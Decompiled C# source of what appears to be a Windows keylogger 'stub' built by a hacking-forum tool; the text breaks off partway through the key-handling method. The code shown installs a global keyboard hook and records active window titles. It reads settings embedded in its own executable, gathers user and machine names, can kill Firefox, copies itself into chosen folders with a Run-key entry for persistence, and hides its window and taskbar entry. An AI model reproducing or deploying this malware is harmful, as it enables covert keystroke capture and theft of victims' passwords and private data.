using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;

namespace ns1;

[DesignerGenerated]
internal class Form1 : Form
{
	internal class Class5
	{
		private struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;
		}

		private delegate int Delegate0(int nCode, int wParam, ref Struct0 lParam);

		internal delegate void Delegate1(Keys Key);

		internal delegate void Delegate2(Keys Key);

		private const int int_0 = 0;

		private const int int_1 = 13;

		private const int int_2 = 256;

		private const int int_3 = 257;

		private const int int_4 = 260;

		private const int int_5 = 261;

		private static Delegate1 delegate1_0;

		private static Delegate2 delegate2_0;

		private static int int_6;

		private static Delegate0 delegate0_0;

		public static event Delegate1 KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				delegate1_0 = (Delegate1)Delegate.Combine(delegate1_0, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				delegate1_0 = (Delegate1)Delegate.Remove(delegate1_0, value);
			}
		}

		public static event Delegate2 KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				delegate2_0 = (Delegate2)Delegate.Combine(delegate2_0, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				delegate2_0 = (Delegate2)Delegate.Remove(delegate2_0, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, Delegate0 lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, Struct0 lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public Class5()
		{
			delegate0_0 = smethod_0;
			int_6 = SetWindowsHookExA(13, delegate0_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int smethod_0(int nCode, int wParam, ref Struct0 lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					delegate1_0?.Invoke((Keys)lParam.int_0);
					break;
				case 257:
				case 261:
					delegate2_0?.Invoke((Keys)lParam.int_0);
					break;
				}
			}
			return CallNextHookEx(int_6, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(int_6);
			base.Finalize();
		}
	}

	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	private TextBox textBox_0;

	private TextBox textBox_1;

	private TextBox textBox_2;

	private TextBox textBox_3;

	private TextBox textBox_4;

	private TextBox textBox_5;

	private TextBox textBox_6;

	private CheckBox checkBox_0;

	private CheckBox checkBox_1;

	private CheckBox checkBox_2;

	private CheckBox checkBox_3;

	private CheckBox checkBox_4;

	private TextBox textBox_7;

	private TextBox textBox_8;

	private TextBox textBox_9;

	private TextBox textBox_10;

	private CheckBox checkBox_5;

	private TextBox textBox_11;

	private Random random_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private string string_23;

	private string string_24;

	private string string_25;

	private string string_26;

	private string string_27;

	private string string_28;

	[AccessedThroughProperty("kbHook")]
	private Class5 class5_0;

	private bool bool_0;

	private StreamWriter streamWriter_0;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	private virtual Class5 kbHook
	{
		[DebuggerNonUserCode]
		get
		{
			return class5_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			Class5.Delegate1 value2 = method_2;
			Class5.Delegate2 value3 = method_1;
			if (class5_0 != null)
			{
				Class5.KeyDown -= value2;
				Class5.KeyUp -= value3;
			}
			class5_0 = value;
			if (class5_0 != null)
			{
				Class5.KeyDown += value2;
				Class5.KeyUp += value3;
			}
		}
	}

	public Form1()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		textBox_0 = new TextBox();
		textBox_1 = new TextBox();
		textBox_2 = new TextBox();
		textBox_3 = new TextBox();
		textBox_4 = new TextBox();
		textBox_5 = new TextBox();
		textBox_6 = new TextBox();
		checkBox_0 = new CheckBox();
		checkBox_1 = new CheckBox();
		checkBox_2 = new CheckBox();
		checkBox_3 = new CheckBox();
		checkBox_4 = new CheckBox();
		textBox_7 = new TextBox();
		textBox_8 = new TextBox();
		textBox_9 = new TextBox();
		textBox_10 = new TextBox();
		checkBox_5 = new CheckBox();
		textBox_11 = new TextBox();
		random_0 = new Random();
		string_0 = Path.GetFileName(Application.get_ExecutablePath());
		kbHook = new Class5();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		icontainer_0 = new Container();
		Timer1 = new Timer(icontainer_0);
		Timer2 = new Timer(icontainer_0);
		Timer3 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(4, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("your mum");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_03bd: Unknown result type (might be due to invalid IL or missing references)
		string text = "keylogfreeforHF";
		checked
		{
			try
			{
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				string text2 = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref text2, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				string[] array = Strings.Split(text2, text, -1, (CompareMethod)0);
				textBox_1.set_Text(array[1]);
				textBox_2.set_Text(array[2]);
				if (Operators.CompareString(array[8], "errorOS", false) == 0)
				{
					checkBox_0.set_Checked(true);
					string_5 = array[4];
					string_7 = array[6];
					string_6 = array[5];
				}
				textBox_11.set_Text(array[7]);
				if (Operators.CompareString(array[9], "emailOS", false) == 0)
				{
					checkBox_3.set_Checked(true);
				}
				if (Operators.CompareString(array[10], "getcomp", false) == 0)
				{
					checkBox_1.set_Checked(true);
				}
				if (Operators.CompareString(array[13], "adding", false) == 0)
				{
					checkBox_5.set_Checked(true);
					string_15 = array[15];
				}
				string_14 = array[14];
				string_16 = array[16];
				string_17 = array[17];
				string_18 = array[18];
				string_19 = array[19];
				string_20 = array[20];
				string_21 = array[21];
				string_22 = array[22];
				string_23 = array[23];
				string_24 = array[24];
				string_25 = array[25];
				string_26 = array[26];
				string_27 = array[27];
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(moduleName);
			Process[] processesByName = Process.GetProcessesByName(fileNameWithoutExtension);
			if (processesByName.Length > 1)
			{
				Application.Exit();
			}
			if (Operators.CompareString(string_27, "Yes", false) == 0)
			{
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("firefox"), false) == 0)
					{
						processes[i].Kill();
					}
				}
			}
			if ((Operators.CompareString(string_16, "Yes", false) == 0) | (Operators.CompareString(string_17, "Yes", false) == 0) | (Operators.CompareString(string_18, "Yes", false) == 0) | (Operators.CompareString(string_19, "Yes", false) == 0) | (Operators.CompareString(string_20, "Yes", false) == 0) | (Operators.CompareString(string_21, "Yes", false) == 0) | (Operators.CompareString(string_22, "Yes", false) == 0) | (Operators.CompareString(string_23, "Yes", false) == 0) | (Operators.CompareString(string_24, "Yes", false) == 0) | (Operators.CompareString(string_25, "Yes", false) == 0) | (Operators.CompareString(string_26, "Yes", false) == 0))
			{
				Timer3.set_Interval(1000);
				Timer3.Start();
			}
			if (checkBox_4.get_Checked())
			{
				textBox_9.set_Text(Environment.UserName);
			}
			if (checkBox_1.get_Checked())
			{
				textBox_8.set_Text(Environment.MachineName);
			}
			if (Class7.Settings.runonce)
			{
				Class7.Settings.runonce = false;
				if (checkBox_0.get_Checked() && Operators.CompareString(string_6, "msgexcl", false) == 0)
				{
					Interaction.MsgBox((object)string_5, (MsgBoxStyle)48, (object)string_7);
				}
				if (checkBox_5.get_Checked())
				{
					try
					{
						string fileName = Path.GetFileName(Application.get_ExecutablePath());
						if (Operators.CompareString(string_15, "applocal", false) == 0)
						{
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "approaming", false) == 0)
						{
							string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath2 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath2 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "cdrive", false) == 0)
						{
							string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath3 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath3 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "desktop", false) == 0)
						{
							string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath4 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath4 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "docs", false) == 0)
						{
							string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath5 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath5 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "music", false) == 0)
						{
							string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath6 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath6 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "pics", false) == 0)
						{
							string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath7 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath7 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "progfiles", false) == 0)
						{
							string folderPath8 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath8 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath8 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "start", false) == 0)
						{
							string folderPath9 = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath9 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath9 + "\\" + fileName);
						}
						else if (Operators.CompareString(string_15, "system", false) == 0)
						{
							string folderPath10 = Environment.GetFolderPath(Environment.SpecialFolder.System);
							((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath10 + "\\" + fileName, true);
							Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(string_14, folderPath10 + "\\" + fileName);
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			Timer1.Start();
			Timer2.set_Interval((int)Math.Round(Conversions.ToDouble(textBox_11.get_Text()) * 60.0 * 1000.0));
			Timer2.Start();
			((Control)this).set_Visible(false);
			((Control)this).Hide();
			((Form)this).set_ShowInTaskbar(false);
			((ApplicationSettingsBase)Class7.Settings).Save();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("USER32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyState(long vKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string method_0()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void method_1(Keys Key)
	{
	}

	private void method_2(Keys Key)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Invalid comparison between Unknown and I4
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Invalid comparison between Unknown and I4
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Invalid comparison between Unknown and I4
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Invalid comparison between Unknown and I4
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Invalid comparison between Unknown and I4
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_0284: Invalid comparison between Unknown and I4
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ed: Invalid comparison between Unknown and I4
		//IL_0353: Unknown result type (might be due to invalid IL or missing references)
		//IL_0356: Invalid comparison between Unknown and I4
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Invalid comparison between Unknown and I4
		//IL_0425: Unknown result type (might be due to invalid IL or missing references)
		//IL_0428: Invalid comparison between Unknown and I4
		//IL_048e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0491: Invalid comparison between Unknown and I4
		//IL_04f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fa: Invalid comparison between Unknown and I4
		//IL_0560: Unknown result type (might be due to invalid IL or missing references)
		//IL_0563: Invalid comparison between Unknown and I4
		//IL_05c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cc: Invalid comparison between Unknown and I4
		//IL_0632: Unknown result type (might be due to invalid IL or missing references)
		//IL_0635: Invalid comparison between Unknown and I4
		//IL_069b: Unknown result type (might be due to invalid IL or missing references)
		//IL_069e: Invalid comparison between Unknown and I4
		//IL_0704: Unknown result type (might be due to invalid IL or missing references)
		//IL_0707: Invalid comparison between Unknown and I4
		//IL_076d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0770: Invalid comparison between Unknown and I4
		//IL_07d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d9: Invalid comparison between Unknown and I4
		//IL_083f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0842: Invalid comparison between Unknown and I4
		//IL_08a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ab: Invalid comparison between Unknown and I4
		//IL_0911: Unknown result type (might be due to invalid IL or missing references)
		//IL_0914: Invalid comparison between Unknown and I4
		//IL_097a: Unknown result type (might be due to invalid IL or missing references)
		//IL_097d: Invalid comparison between Unknown and I4
		//IL_09e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e6: Invalid comparison between Unknown and I4
		//IL_0a4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4f: Invalid comparison between Unknown and I4
		//IL_0ab5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab8: Invalid comparison between Unknown and I4
		//IL_0b1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b21: Invalid comparison between Unknown and I4
		//IL_0b87: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b8a: Invalid comparison between Unknown and I4
		//IL_0bf0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf3: Invalid comparison between Unknown and I4
		//IL_0c59: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c5c: Invalid comparison between Unknown and I4
		//IL_0cc2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc5: Invalid comparison between Unknown and I4
		//IL_0d2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d2e: Invalid comparison between Unknown and I4
		//IL_0d94: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d97: Invalid comparison between Unknown and I4
		//IL_0dfd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e00: Invalid comparison between Unknown and I4
		//IL_0e66: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e69: Invalid comparison between Unknown and I4
		//IL_0ecf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed2: Invalid comparison between Unknown and I4
		//IL_0f38: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f3e: Invalid comparison between Unknown and I4
		//IL_0fa4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0faa: Invalid comparison between Unknown and I4
		//IL_1010: Unknown result type (might be due to invalid IL or missing references)
		//IL_1016: Invalid comparison between Unknown and I4
		//IL_107c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1082: Invalid comparison between Unknown and I4
		//IL_10e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ee: Invalid comparison between Unknown and I4
		//IL_1154: Unknown result type (might be due to invalid IL or missing references)
		//IL_115a: Invalid comparison between Unknown and I4
		//IL_11c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c6: Invalid comparison between Unknown and I4
		//IL_122c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1232: Invalid comparison between Unknown and I4
		//IL_1298: Unknown result type (might be due to invalid IL or missing references)
		//IL_129e: Invalid comparison between Unknown and I4
		//IL_1304: Unknown result type (might be due to invalid IL or missing references)
		//IL_130a: Invalid comparison between Unknown and I4
		//IL_1370: Unknown result type (might be due to invalid IL or missing references)
		//IL_1376: Invalid comparison between Unknown and I4
		//IL_13dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_13df: Invalid comparison between Unknown and I4
		//IL_1450: Unknown result type (might be due to invalid IL or missing references)
		//IL_1453: Invalid comparison between Unknown and I4
		//IL_147a: Unknown result type (might be due to invalid IL or missing references)
		//IL_147d: Invalid comparison between Unknown and I4
		//IL_14a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a7: Invalid comparison between Unknown and I4
		//IL_14ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_14d1: Invalid comparison between Unknown and I4
		//IL_14f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_14fa: Invalid comparison between Unknown and I4
		//IL_1521: Unknown result type (might be due to invalid IL or missing references)
		//IL_1527: Invalid comparison between Unknown and I4
		//IL_1598: Unknown result type (might be due to invalid IL or missing references)
		//IL_159e: Invalid comparison between Unknown and I4
		//IL_160f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1612: Invalid comparison between Unknown and I4
		//IL_1639: Unknown result type (might be due to invalid IL or missing references)
		//IL_163c: Invalid comparison between Unknown and I4
		//IL_1663: Unknown result type (might be due to invalid IL or missing references)
		//IL_1666: Invalid comparison between Unknown and I4
		//IL_168d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1690: Invalid comparison between Unknown and I4
		//IL_16b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_16ba: Invalid comparison between Unknown and I4
		//IL_16e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_16e4: Invalid comparison between Unknown and I4
		//IL_175a: Unknown result type (might be due to invalid IL or missing references)
		//IL_175d: Invalid comparison between Unknown and I4
		//IL_17d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_17d6: Invalid comparison between Unknown and I4
		//IL_17fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1800: Invalid comparison between Unknown and I4
		//IL_1827: Unknown result type (might be due to invalid IL or missing references)
		//IL_182a: Invalid comparison between Unknown and I4
		//IL_1851: Unknown result type (might be due to invalid IL or missing references)
		//IL_1854: Invalid comparison between Unknown and I4
		//IL_187b: Unknown result type (might be due to invalid IL or missing references)
		//IL_187e: Invalid comparison between Unknown and I4
		//IL_18a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_18a8: Invalid comparison between Unknown and I4
		//IL_18cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_18d2: Invalid comparison between Unknown and I4
		//IL_18f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_18fc: Invalid comparison between Unknown and I4
		//IL_1923: Unknown result type (might be due to invalid IL or missing references)
		//IL_1929: Invalid comparison between Unknown and I4
		//IL_1950: Unknown result type (might be due to invalid IL or missing references)
		//IL_1953: Invalid comparison between Unknown and I4
		//IL_197a: Unknown result type (might be due to invalid IL or missing references)
		//IL_197d: Invalid comparison between Unknown and I4
		//IL_19a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_19a7: Invalid comparison between Unknown and I4
		//IL_19ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_19d1: Invalid comparison between Unknown and I4
		//IL_19f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_19fb: Invalid comparison between Unknown and I4
		//IL_1a22: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a25: Invalid comparison between Unknown and I4
		//IL_1a4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a4f: Invalid comparison between Unknown and I4
		//IL_1ac5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ac8: Invalid comparison between Unknown and I4
		//IL_1aef: Unknown result type (might be due to invalid IL or missing references)
		//IL_1af2: Invalid comparison between Unknown and I4
		//IL_1b19: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b1c: Invalid comparison between Unknown and I4
		//IL_1b43: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b46: Invalid comparison between Unknown and I4
		//IL_1b6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b70: Invalid comparison between Unknown and I4
		//IL_1b97: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b9a: Invalid comparison between Unknown and I4
		//IL_1bc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bc4: Invalid comparison between Unknown and I4
		//IL_1beb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bee: Invalid comparison between Unknown and I4
		//IL_1c15: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c18: Invalid comparison between Unknown and I4
		//IL_1c3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c42: Invalid comparison between Unknown and I4
		//IL_1c69: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c6c: Invalid comparison between Unknown and I4
		//IL_1c93: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c96: Invalid comparison between Unknown and I4
		//IL_1cbd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cc0: Invalid comparison between Unknown and I4
		//IL_1ce7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cea: Invalid comparison between Unknown and I4
		//IL_1d11: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d14: Invalid comparison between Unknown and I4
		//IL_1d3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d3e: Invalid comparison between Unknown and I4
		//IL_1d65: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d68: Invalid comparison between Unknown and I4
		//IL_1d8f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d92: Invalid comparison between Unknown and I4
		//IL_1db9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dbc: Invalid comparison between Unknown and I4
		//IL_1de0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1de3: Invalid comparison between Unknown and I4
		//IL_1e07: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e0a: Invalid comparison between Unknown and I4
		//IL_1e2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e34: Invalid comparison between Unknown and I4
		if (!Timer1.get_Enabled())
		{
			return;
		}
		if (GetAsyncKeyState(16L) != 0)
		{
			bool_0 = true;
		}
